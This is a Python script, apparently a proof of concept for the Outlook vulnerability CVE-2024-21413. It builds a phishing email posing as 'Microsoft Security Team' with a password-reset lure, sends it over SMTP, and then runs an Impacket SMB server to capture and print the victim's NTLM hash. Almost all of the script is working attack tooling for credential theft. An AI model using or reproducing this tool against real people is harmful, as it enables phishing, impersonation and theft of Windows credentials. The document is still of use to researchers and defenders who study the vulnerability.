import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import argparse
import sys
import os
import subprocess
import datetime
import random
import re
import shutil

terminal_width = shutil.get_terminal_size().columns

DARK_GRAY = "\033[90m"
LIGHT_MAGENTA = "\033[95m"
YELLOW = "\033[93m"
LIGHT_CYAN = "\033[96m"
LIGHT_GRAY = "\033[97m"
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"  # Brown/Orange
BLUE = "\033[34m"
PURPLE = "\033[35m"
CYAN = "\033[36m"
LIGHT_GRAY = "\033[37m"
ENDC = "\033[0m"

print("*" * terminal_width)

def display_banner():
    
    terminal_width = os.get_terminal_size().columns

    banner_content = f"""
                                                        {LIGHT_MAGENTA}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.

                                                                                    {DARK_GRAY}Dionis Shabani / @vito {ENDC}
"""

    
    leading_spaces = (terminal_width - len(banner_content.split('\n')[1])) // 2
    print(" " * leading_spaces + banner_content)

def check_root():
    """Check if the script is run with root privileges."""
    if os.geteuid() != 0:
        print(f"{RED}❌ This script must be run as root.{ENDC}")
        sys.exit(1)

def check_impacket_installation():
    """Check if impacket-smbserver is installed."""
    try:
        subprocess.check_output(["impacket-smbserver", "-h"])
        return True
    except subprocess.CalledProcessError:
        return False

def install_impacket():
    """Install impacket."""
    print(f"{GREEN}Installing impacket...{ENDC}")
    subprocess.run("pip install impacket", shell=True)
   
    for _ in range(5):
        print(".", end="", flush=True)
        time.sleep(1)
    print(f"\n{GREEN}✅ impacket installed successfully.{ENDC}✅")

def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject, html_content):

    """Sends an email with both plain text and HTML parts, including advanced features."""
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = f'Microsoft Security Team <{sender_email}>'
    msg['To'] = recipient_email

    text = "Please read this email in HTML format."

    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html_content, 'html')
    msg.attach(part1)
    msg.attach(part2)

    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(username, password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print("★" * terminal_width)
            print()
            print(f"{GREEN}✅ Email sent successfully to {recipient_email}.{ENDC}✅ ")
            print()
            print("★" * terminal_width)
            print()
            return True
    except Exception as e:
        print(f"{RED}❌ Failed to send email to {recipient_email}: {e}{ENDC}❌")
        return False

def read_html_template(folder_name, file_name, url, recipient_email):
    html_path = os.path.join(folder_name, file_name + ".html")
    with open(html_path, "r") as file:
        html_content = file.read()
    # Replace placeholders with actual values
    html_content = html_content.replace("{current_date_time}", datetime.datetime.now().strftime("%m/%d/%Y %I:%M %p (GMT)"))
    first_octet = random.randint(0, 200)
    second_octet = random.randint(0, 200)
    random_ipv4_address = f"{first_octet}.{second_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    html_content = html_content.replace("{random_ipv4_address}", random_ipv4_address)
    html_content = html_content.replace("{recipient_email}", recipient_email)
    html_content = html_content.replace("{url}", url)
    if recipient_email and file_name == "Blocked-Account-Reset-Password-Email-Template":
        recipient_first_name = input(f"{RED}Enter the First Name of the Recipient: {GREEN}")
        print()
        html_content = html_content.replace("{recipient_first_name}", recipient_first_name)
        html_content = html_content.replace("{recipient_email}", recipient_email)
        html_content = html_content.replace("{url}", url)
    return html_content

def extract_ntlm_hash(output):
    # Regular expression pattern to match the NTLM hash format
    pattern = r"\b\w+::[\w-]+:[a-fA-F0-9]+:[a-fA-F0-9]+:[a-fA-F0-9]+\b"

    # Search for the pattern in the output
    match = re.search(pattern, output)
    if match:
        return match.group(0)
    else:
        return None

def main():
    display_banner()
    print("★" * terminal_width)
    print()
    print("Please provide the following details:")
    print()
    smtp_server = input(f"{RED}SMTP Server Name: {GREEN}")
    port = int(input(f"{RED}SMTP Port: {GREEN}"))
    username = input(f"{RED}Username: {GREEN}")
    password = input(f"{RED}Password: {GREEN}")
    sender_email = input(f"{RED}Sender Email: {GREEN}")
    recipient_email = input(f"{RED}Recipient Email: {GREEN}")
    url = input(f"{RED}URL: {GREEN}")
    subject = input(f"{RED}Subject: {GREEN}")
    print()
    folder_name = input(f"{RED}Enter the folder name where the HTML file is located: {GREEN}")
    file_name = input(f"{RED}Enter the HTML file name (without the .html extension): {GREEN}")
    print()

    check_root()

    if not check_impacket_installation():
        install_impacket()

    html_content = read_html_template(folder_name, file_name, url, recipient_email)

    sent_successfully = send_email(smtp_server, port, username, password, sender_email, recipient_email, url, subject, html_content)

    if sent_successfully:
        try:
            # Capture the output of the Impacket SMB server process
            server_process = subprocess.Popen(["sudo", "impacket-smbserver", "-smb2support", "-ip", "0.0.0.0", "test", "/tmp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Start Impacket SMB server
            print(f"{GREEN}✅ Impacket SMB server started successfully. Waiting for connection...{ENDC}")
            print()

            # Wait for the user to capture the NTLM hash
            input("Press Enter to capture NTLM hash...")
            print()

            # Terminate Impacket SMB server
            server_process.terminate()
            print(f"{GREEN}✅ Impacket SMB server terminated.{ENDC}")
            print()
            
            # Read and process the output of the Impacket SMB server process
            output, _ = server_process.communicate()

            # Extract NTLM hash from the output
            ntlm_hash = extract_ntlm_hash(output)
            if ntlm_hash:
                print(f"{GREEN}✅ Successfully captured NTLM hash: {LIGHT_MAGENTA}{ntlm_hash}.{ENDC}")
            else:
                print(f"{RED}❌ NTLM hash not found in the output.{ENDC}")
            
        except Exception as e:
            print(f"{RED}❌ Error: {e}{ENDC}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}❌ This script must be run as root.{ENDC}")
        sys.exit(1)
    main()
